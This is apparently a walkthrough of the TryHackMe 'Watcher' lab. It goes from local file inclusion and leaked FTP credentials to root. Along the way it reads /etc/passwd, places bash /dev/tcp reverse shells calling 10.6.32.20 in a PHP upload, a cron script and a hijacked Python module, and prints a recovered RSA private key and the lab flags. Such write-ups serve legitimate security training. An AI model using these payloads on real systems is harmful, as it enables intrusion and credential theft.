# Tryhackme.com Room : Watcher

`https://tryhackme.com/room/watcher`

## Initlal Foothold

We have a website running `apache` on port `80`.
Looking at `/robots.txt` we get :
```
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```

We retrieve the first flag at `/flag_1.txt`:
```
FLAG{robots_dot_text_what_is_next}
```

We get a permission denied for `/secret_file_do_not_read.txt`
There is a `LFI` at `/post.php?post=/etc/passwd`
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
will:x:1000:1000:will:/home/will:/bin/bash
ftp:x:111:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
ftpuser:x:1001:1001:,,,:/home/ftpuser:/usr/sbin/nologin
mat:x:1002:1002:,#,,:/home/mat:/bin/bash
toby:x:1003:1003:,,,:/home/toby:/bin/bash
```

We can't retrieve `ssh` keys for users `mat`, `toby` or `will`.
We can't retrieve `/var/log/apache2/access.log` either.

Let's check the file that we couldn't read earlier `/post.php?post=secret_file_do_not_read.txt`

```
Hi Mat,

The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files.

Will

----------

ftpuser:givemefiles777
```

We can retrieve the second flag `flag_2.txt` :
```
FLAG{ftp_you_and_me}
```

There is a folder named `files` but it's empty. Seems like that all we can do on the `ftp` server.
Actually, there is more we can do using the `ftp` server.
We know that the ftp is served from `/home/ftpuser/ftp` so we can upload a `php` file in there and use the `lfi` to get a shell. I tested with `phpinfo()` and it work.
Now we upload a `php revshell`:
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.6.32.20/7777 0>&1'");
```
We now have a shell as `www-data`.
we find the folder `/var/www/html/more_secrets_a9f10a` which contains `flag_3.txt`:
```
FLAG{lfi_what_a_guy}
```

## Lateral movement
We look into `/home/mat` and find `/home/mat/note.txt` :
```
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
```
Look like we need to be `mat` to move to `will` user.

running `sudo -l` as `www-data` we see :
```
User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL
```

Lets `sudo -u toby /bin/bash`.
We find the next flag in `/home/toby/flag_4.txt`:
```
FLAG{chad_lifestyle}
```
We also see `/home/toby/note.txt` :
```
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
```
There is a script in `/home/toby/jobs/cow.sh` that we can edit. This is probably the script runned as `mat` in the `cronjob`. 
We look at `/etc/crontab` and see :
```
*/1 * * * * mat /home/toby/jobs/cow.sh
```
We add a reverse shell at the end of `cow.sh` and we get a shell as `mat`.
We find the fifth flag in `/home/mat/flag_5.txt` :
```
FLAG{live_by_the_cow_die_by_the_cow}
```

As mentionned in the note in `/home/mat/note.txt` we can run `sudo` :
```
User mat may run the following commands on watcher:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

`/home/mat/scripts/will_script.py` :
```
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
        print("Invalid command!")
        exit()

os.system(cmd)
```

It import `get_command` from `/home/mat/scripts/cmd.py` :
```
def get_command(num):
        if(num == "1"):
                return "ls -lah"
        if(num == "2"):
                return "id"
        if(num == "3"):
                return "cat /etc/passwd"
```

We can simply add another revshell inside `cmd.py` and it will be executed when the file is imported.
We just add these lines at the end of `cmd.py` :
```python
import os
os.system("/bin/bash -c 'bash -i >& /dev/tcp/10.6.32.20/7779 0>&1'")
```

Then run `sudo -u will python3 /home/mat/scripts/will_script.py 2` and we get a shell as `will`
We retrieve the next flag in `/home/will/flag_6.txt`:
```
FLAG{but_i_thought_my_script_was_secure}
```

## Priv esc

`will` doesn't have `sudo` rights.
We see that `will` is member of `adm` group
We search for files belonging to this group using `find / -group adm 2>/dev/null` and find
```
/opt/backup/key.b64
```

Which is a private key encoded as `base64`.
We just decode it and get 
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAzPaQFolQq8cHom9mssyPZ53aLzBcRyBw+rysJ3h0JCxnV+aG
opZdcQz01YOYdjYIaZEJmdcPVWQp/L0uc5u3igoiK1uiYMfw850N7t3OX/erdKF4
jqVu3iXN9doBmr3TuU9RJkVnDDuo8y4DtIuFCf92ZfEAJGUB2+vFON7q4KJsIxgA
nM8kj8NkFkFPk0d1HKH2+p7QP2HGZrf3DNFmQ7Tuja3zngbEVO7NXx3V3YOF9y1X
eFPrvtDQV7BYb6egklafs4m4XeUO/csM84I6nYHWzEJ5zpcSrpmkDHxC8yH9mIVt
dSelabW2fuLAi51UR/2wNqL13hvGglpePhKQgQIDAQABAoIBAHmgTryw22g0ATnI
9Z5geTC5oUGjZv7mJ2UDFP2PIwxcNS8aIwbUR7rQP3F8V7q+MZvDb3kU/4pil+/c
q3X7D50gikpEZEUeIMPPjPcUNGUKaXoaX5n2XaYBtQiRR6Z1wvASO0uEn7PIq2cz
BQvcRyQ5rh6sNrNiJQpGDJDE54hIigic/GucbynezYya8rrIsdWM/0SUl9JknI0Q
TQOi/X2wfyryJsm+tYcvY4ydhChK+0nVTheciUrV/wkFvODbGMSuuhcHRKTKc6B6
1wsUA85+vqNFrxzFY/tW188W00gy9w51bKSKDxboti2gdgmFolpnFw+t0QRB5RCF
AlQJ28kCgYEA6lrY2xyeLh/aOBu9+Sp3uJknIkObpIWCdLd1xXNtDMAz4OqbrLB5
fJ/iUcYjwOBHt3NNkuUm6qoEfp4Gou14yGzOiRkAe4HQJF9vxFWJ5mX+BHGI/vj2
Nv1sq7PaIKq4pkRBzR6M/ObD7yQe78NdlQvLnQTlWp4njhjQoHOsovsCgYEA3+TE
7QR77yQ8l1iGAFYRXIzBgp5eJ2AAvVpWJuINLK5lmQ/E1x2K98E73CpQsRDG0n+1
vp4+Y8J0IB/tGmCf7IPMeiX80YJW7Ltozr7+sfbAQZ1Ta2o1hCalAQyIk9p+EXpI
UbBVnyUC1XcvRfQvFJyzgccwExEr6glJKOj64bMCgYEAlxmx/jxKZLTWzxxb9V4D
SPs+NyJeJMqMHVL4VTGh2vnFuTuq2cIC4m53zn+xJ7ezpb1rA85JtD2gnj6nSr9Q
A/HbjJuZKwi8uebquizot6uFBzpouPSuUzA8s8xHVI6edV1HC8ip4JmtNPAWHkLZ
gLLVOk0gz7dvC3hGc12BrqcCgYAhFji34iLCi3Nc1lsvL4jvSWnLeMXnQbu6P+Bd
bKiPwtIG1Zq8Q4Rm6qqC9cno8NbBAtiD6/TCX1kz6iPq8v6PQEb2giijeYSJBYUO
kJEpEZMF308Vn6N6/Q8DYavJVc+tm4mWcN2mYBzUGQHmb5iJjkLE2f/TwYTg2DB0
mEGDGwKBgQCh+UpmTTRx4KKNy6wJkwGv2uRdj9rta2X5pzTq2nEApke2UYlP5OLh
/6KHTLRhcp9FmF9iKWDtEMSQ8DCan5ZMJ7OIYp2RZ1RzC9Dug3qkttkOKAbccKn5
4APxI1DxU+a2xXXf02dsQH0H5AhNCiTBD7I5YRsM1bOEqjFdZgv6SA==
-----END RSA PRIVATE KEY-----
```

Easy peasy.
We use the key to ssh as `root` and we retrieve the last flag :
`/root/flag_7.txt`
```
FLAG{who_watches_the_watchers}
```

## Wrap up
* This was a pretty easy box with a lot of hints (As files on the boxe). Didn't learn anything new.

